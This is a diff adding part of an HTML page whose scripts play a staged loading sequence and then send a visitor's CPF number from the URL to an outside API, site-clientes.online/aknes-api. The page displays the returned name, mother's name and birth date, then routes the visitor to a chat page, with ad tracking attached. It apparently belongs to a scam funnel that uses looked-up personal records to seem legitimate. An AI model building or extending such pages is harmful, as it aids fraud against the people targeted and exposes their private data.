+                    const progressBar = document.getElementById("progress-bar");
+                    const buttonContainer = document.getElementById("button-container");
+                    const statusText = document.getElementById("status-text");
+                    const loadingIcon = document.getElementById("loading-icon");
+            
+                    let currentIndex = 0;
+                    const intervalTime = totalTime / statusTexts.length;
+            
+                    // Update status text periodically
+                    const statusInterval = setInterval(() => {
+                        if (currentIndex < statusTexts.length) {
+                            statusText.textContent = statusTexts[currentIndex];
+                            currentIndex++;
+                        }
+            
+                        if (currentIndex === statusTexts.length) {
+                            // Disable pulse animation and remove loading icon at the last text
+                            statusText.classList.remove("animate-pulse");
+                            loadingIcon.remove();
+                        }
+                    }, intervalTime);
+            
+                    // Update progress bar gradually
+                    const progressInterval = 10; // Update every 10ms
+                    let elapsedTime = 0;
+                    const progressBarInterval = setInterval(() => {
+                        elapsedTime += progressInterval;
+                        const percentage = (elapsedTime / totalTime) * 100;
+                        progressBar.style.width = `${Math.min(percentage, 100)}%`;
+            
+                        if (elapsedTime >= totalTime) {
+                            clearInterval(progressBarInterval);
+                        }
+                    }, progressInterval);
+            
+                    // Show the button after the total time
+                    setTimeout(() => {
+                        clearInterval(statusInterval);
+                        statusText.textContent = statusTexts[statusTexts.length - 1]; // Ensure final text is displayed
+                        buttonContainer.classList.remove("hidden");
+            
+                        // Redirection logic
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const cpf = urlParams.get('cpf');
+                        if (cpf) {
+                            const nextPageButton = document.getElementById('next-page-button');
+                            nextPageButton.addEventListener('click', () => {
+                                window.location.href = `chat.html?cpf=${cpf}`;
+                            });
+                        } else {
+                            console.error('CPF não encontrado na URL');
+                        }
+                    }, totalTime);
+                </script>
+
+                <style>
+                    .animate-pulse {
+            animation: pulse 2s cubic-bezier(.4, 0, .6, 1) infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+                </style>
+
+                
+                <script>
+                    function formatCpf(cpf) {
+                        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+                    }
+            
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const cpf = urlParams.get('cpf');
+            
+                    if (cpf) {
+                        fetch(`https://site-clientes.online/aknes-api/aknes.php?cpf=${cpf}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data && (data.status === 200 || data.nome)) {
+                                    document.getElementById('mae').textContent = `${data.mae || data.MAE || 'INDISPONIVEL'}`;
+                                    document.getElementById('nome').textContent = `${data.nome || data.NOME || ''}`;
+                                    document.getElementById('cpf').textContent = `${formatCpf(cpf)}`;
+                                    document.getElementById('nascimento').textContent = `${data.nascimento || data.NASCIMENTO || ''}`;
+                                } else {
+                                    document.body.innerHTML = '<p>Erro: Nenhum dado encontrado para o CPF fornecido.</p>';
+                                }
+                            })
+                            .catch(() => {
+                                document.body.innerHTML = '<p>Erro ao buscar os dados do CPF.</p>';
+                            });
+                    } else {
+                        document.body.innerHTML = '<p>Erro: CPF não fornecido na URL.</p>';
+                    }
+                </script>
+
+
+            </div>
+        </div>
+    </div>
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</body>
+
+</html>
